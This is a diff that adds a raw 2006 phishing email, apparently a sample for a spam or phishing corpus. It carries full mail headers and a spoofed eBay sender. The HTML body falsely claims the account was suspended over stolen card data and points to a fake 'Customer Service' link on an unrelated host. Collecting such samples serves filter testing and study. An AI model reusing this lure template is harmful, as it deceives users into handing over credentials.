@@ -1,0 +1,80 @@
+Return-Path: <wwwrun@nfs1-cluster1-med1.carpediem-it.co.uk>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+	by example.com (Postfix) with ESMTP id 8F01347FA2
+	for <user@login.example.com>; Sun,  3 Dec 2006 16:32:50 -0500 (EST)
+Received: from mail.example.org (mail.example.org [192.168.6.4])
+	by mail.example.org (Postfix) with ESMTP id 87BB5131FA9F
+	for <user@example.com>; Sun,  3 Dec 2006 16:32:50 -0500 (EST)
+Received: from nfs1-cluster1-med1 (nfs1-cluster1-med1.carpediem-it.co.uk [195.114.111.26])
+	by mail.example.org (Postfix) with ESMTP id 15A996FC217
+	for <user@example.com>; Sat,  2 Dec 2006 18:50:51 -0500 (EST)
+Received: from nfs1-cluster1-med1.carpediem-it.co.uk (localhost [127.0.0.1])
+	by nfs1-cluster1-med1 (8.13.4/8.13.4) with ESMTP id kB2NiHxW013760
+	for <user@example.com>; Sun, 3 Dec 2006 00:44:17 +0100
+Received: (from wwwrun@localhost)
+	by nfs1-cluster1-med1.carpediem-it.co.uk (8.13.4/8.13.4/Submit) id kB2NiHcL013759;
+	Sun, 3 Dec 2006 00:44:17 +0100
+Date: Sun, 3 Dec 2006 00:44:17 +0100
+Message-Id: <200612022344.kB2NiHcL013759@nfs1-cluster1-med1.carpediem-it.co.uk>
+To: user@example.com
+Subject: Please review your account. 
+From: eBay Account Review <ar_team@server1.ebay.com>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: 8bit
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 469
+
+<html>
+<head>
+<title>Dear eBay Community Member</title>
+<style>
+<!--
+.style1 {
+        font-family: Arial, Helvetica, sans-serif;
+        font-size: 12px;
+}
+-->
+</style>
+</head>
+<body>
+<table width="496" border="0">
+  <tr>
+    <td width="490" style="font-family: arial; font-size: 10pt"><img src="http://pics.ebaystatic.com/aw/pics/navbar/eBayLogoTM.gif" border="0"></td>
+  </tr>
+  <tr>
+    <td height="169" valign="top" style="font-family: arial; font-size: 10pt"><p class="style1">
+	<span class="treb">Dear eBay Customer, <br>
+	<br>
+	We are contacting you to inform that our Account Review Team identified some 
+	unusual activity in your account. <br><br>
+	Our team found a stolen credit card information on your account.<br><br>
+	In accordance with our rules and to ensure that your account has not been 
+	compromised, access to your account was suspended. Your account access will 
+	remain suspended until this issue is resolved. <br>
+	<br>
+	To secure your account and quickly restore full access we will require some 
+	additional information from you and, you need to replace the stolen information with yours.<br>
+	<br>
+	Please, click the link bellow in order to fulfill the Security Team 
+	requirements: <br>
+	<br>
+	<a href="http://kieroserfamoso.album.ijijiji.com/album/albums/kieroserfamoso_/userpics/ebay/redirect.php">eBay - Customer Service</a><br>
+	<br>
+	The process is mandatory, and if not completed, your account will be subject 
+	to temporary suspension. <br>
+	<br>
+	Sincerely Yours,<br>
+	Raymundo Hurley<br>
+	eBay Inc - Billing. </span></p>      </td>
+  </tr>
+</table>
+</body>
+</html>
+
+
+
